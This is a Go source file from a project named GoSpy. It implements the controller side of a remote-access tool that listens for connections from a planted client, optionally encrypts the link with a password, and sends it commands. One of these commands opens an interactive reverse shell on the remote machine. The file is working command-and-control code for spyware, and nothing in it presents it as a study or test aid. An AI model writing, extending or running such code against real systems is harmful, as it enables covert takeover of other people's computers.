package client

import (
	"bufio"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"net"
	"os"
	"strings"
)

// GoSpyClient represents a GoSpy client that is connected to this server.
type GoSpyClient struct {
	listener    net.Listener     // The server for listening to for connections from the client.
	connection  comms.Connection // The main connection to the client.
	passwordStr string           // The password for encrypting data over the connection.
}

// NewGoSpyClient creates instantiates a GoSpyClient.
// Binds the listener and waits for client connection before returning.
func NewGoSpyClient(bindAddress, password string) (client GoSpyClient, err error) {
	l, err := net.Listen("tcp", bindAddress)
	if err != nil {
		return GoSpyClient{}, err
	}
	c := GoSpyClient{listener: l, passwordStr: password}
	c.WaitForClient()
	return c, nil
}

// sendString sends a string to the client.
func (c GoSpyClient) sendString(message string) (err error) {
	return c.connection.SendBytes([]byte(message))
}

// recvString receives a string from the client.
func (c GoSpyClient) recvString() (message string, err error) {
	data, err := c.connection.RecvBytes()
	if err != nil {
		return "", err
	}
	return string(data), nil
}

// WaitForClient calls WaitForConnection and then sets the returned Connection to the GoSpyClient's connection field.
func (c *GoSpyClient) WaitForClient() {
	c.connection = c.WaitForConnection()
}

// WaitForConnection waits for a successful connection to the listener and then sets up and returns a Connection.
func (c GoSpyClient) WaitForConnection() comms.Connection {
	for {
		conn, err := c.listener.Accept()
		if err != nil {
			continue
		}
		if c.passwordStr != "" {
			return comms.NewEncryptedConnection(conn, c.passwordStr)
		}
		return comms.NewPlainConnection(conn)
	}
}

// Close closes the current connection.
func (c GoSpyClient) Close() (err error) {
	return c.connection.Close()
}

// CommandExit sends a message to the client for it to stop.
func (c GoSpyClient) CommandExit() error {
	return c.sendString("exit")
}

// CommandPing sends a "ping" to the client and waits for a "pong".
func (c GoSpyClient) CommandPing() (response string, err error) {
	err = c.sendString("ping")
	if err != nil {
		return "", err
	}
	return c.recvString()
}

// CommandReverseShell initiates a new connection with the client and uses it for a reverse shell.
func (c GoSpyClient) CommandReverseShell() (err error) {
	err = c.sendString("reverse-shell")
	if err != nil {
		return err
	}

	reverseShellConnection := c.WaitForConnection()

	fmt.Println("Type `exit` to leave the shell at any time")
	_ = comms.BridgeConnectionToWriter(reverseShellConnection, os.Stdout)

	for {
		reader := bufio.NewReader(os.Stdin)
		text, _ := reader.ReadString('\n')

		textBytes := []byte(text)
		err = reverseShellConnection.SendBytes(textBytes)
		if err != nil {
			// Don't return the error because this is with the reverse shell connection, not with the original connection conn.
			fmt.Printf("Reverse shell connection error: %s\n", err.Error())
			break
		}

		if strings.TrimSpace(text) == "exit" {
			break
		}
	}

	_ = reverseShellConnection.Close()
	return nil
}
